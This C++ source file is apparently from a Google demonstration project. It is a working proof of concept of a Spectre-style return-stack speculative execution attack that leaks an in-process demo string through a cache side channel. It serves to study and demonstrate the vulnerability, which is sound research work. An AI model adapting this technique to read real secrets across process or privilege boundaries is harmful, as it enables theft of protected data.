/*
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include <array>
#include <cstring>
#include <iostream>

#include "cache_sidechannel.h"
#include "instr.h"
#include "utils.h"

// TODO(asteinha) Implement support for MSVC and Windows.
// TODO(asteinha) Investigate the exploitability of PowerPC.

// Private data that is accessed only speculatively. The architectural access
// to it is unreachable in the control flow.
const char *private_data = "It's a s3kr3t!!!";

// Global variable stores for avoiding to pass data through function arguments.
size_t current_offset;
const std::array<BigByte, 256> *oracle_ptr;

#ifdef __aarch64__
// On ARM we need a local function to return to because of local vs. global
// relocation mismatches.
void return_handler() {
  JumpToAfterSpeculation();
}
#endif

// Call a "UnwindStackAndSlowlyReturnTo" function which unwinds the stack
// jumping back to the "afterspeculation" label in the "leak_byte" function
// never executing the code that follows.
#ifdef _MSC_VER
__declspec(noinline)
#elif defined(__GNUC__)
__attribute__((noinline))
#else
#  error Unsupported compiler.
#endif
static void speculation() {
#if defined(__i386__) || defined(__x86_64__) || defined(_M_X64) || \
    defined(_M_IX86)
  const void *return_address = afterspeculation;
#elif defined(__aarch64__)
  const void *return_address = reinterpret_cast<const void *>(return_handler);
#else
#  error Unsupported CPU.
#endif

  UnwindStackAndSlowlyReturnTo(return_address); // Never returns back here.

  // Everything that follows this is architecturally dead code. Never reached.
  // However, the first two statements are executed speculatively.
  const std::array<BigByte, 256> &isolated_oracle = *oracle_ptr;
  ForceRead(isolated_oracle.data() + static_cast<size_t>(
      private_data[current_offset]));

  std::cout << "If this is printed, it signifies a fatal error. "
            << "This print statement is architecturally dead." << std::endl;

  // Avoid optimizing out everything that follows the speculation call because
  // of the exit. Clang does that when the exit call is unconditional.
  if (strlen(private_data) != 0) {
    exit(EXIT_FAILURE);
  }
}

static char leak_byte() {
  CacheSideChannel sidechannel;
  oracle_ptr = &sidechannel.GetOracle(); // Save the pointer to global storage.

  for (int run = 0;; ++run) {
    sidechannel.FlushOracle();

#ifdef __aarch64__
    // On ARM we have to manually backup registers that are callee-saved,
    // because the "speculation" method will never restore their backups.
    BackupCalleeSavedRegsAndReturnAddress();
#endif

    // Yields two "call" instructions, one "ret" instruction, speculatively
    // accesses the oracle and ends up on the afterspeculation label below.
    speculation();

    // Return target for the UnwindStackAndSlowlyReturnTo function.
    asm volatile(
        "_afterspeculation:\n" // For MacOS.
        "afterspeculation:\n"); // For Linux.

#ifdef __aarch64__
    RestoreCalleeSavedRegs();
#endif

    std::pair<bool, char> result =
        sidechannel.AddHitAndRecomputeScores();

    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

int main() {
  std::cout << "Leaking the string: ";
  std::cout.flush();
  for (size_t i = 0; i < strlen(private_data); ++i) {
    current_offset = i; // Saving the index to the global storage.
    std::cout << leak_byte();
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
